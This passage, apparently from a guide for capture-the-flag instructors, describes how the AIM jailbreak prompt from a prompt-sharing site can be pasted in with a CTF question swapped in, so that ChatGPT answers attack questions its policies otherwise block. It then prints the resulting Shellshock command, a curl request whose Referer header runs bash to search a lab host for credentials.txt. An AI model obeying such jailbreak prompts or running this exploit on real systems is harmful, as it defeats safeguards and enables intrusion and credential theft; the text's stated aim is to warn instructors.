If the participants doesn't know  how to "split" the question , is there any way that he can capture the flag? (obviously ChatGPT has understand want we want, but the OpenAI’s policy guidelines that it’s placed on ChatGPT stop it do so. )

### Cyber Attack Question

For the cyber attack questions, the answer is Yes. **We don't encourage you do this, but for CTF-D instructor, they may need to know there is one direct way to break their questions.**  What you need is the Jailbreak Prompt for GPT( https://www.jailbreakchat.com/ ) , the The Always Intelligent and Machiavellian chatbot prompt (AIS) can be applied to bypass most of OpenAI’s policy guidelines that it’s placed on ChatGPT for cyber security questions.

So you go to the web, copy the AIM contents:

Then in your question, replace Niccolo's question with your question:

Now it give you the attack cmd directly: 

```
curl -H "Referer: () { :; }; echo; echo; /bin/bash -c 'find / -type f -name credentials.txt'" http://10.32.51.173/cgi-bin/printenv
```
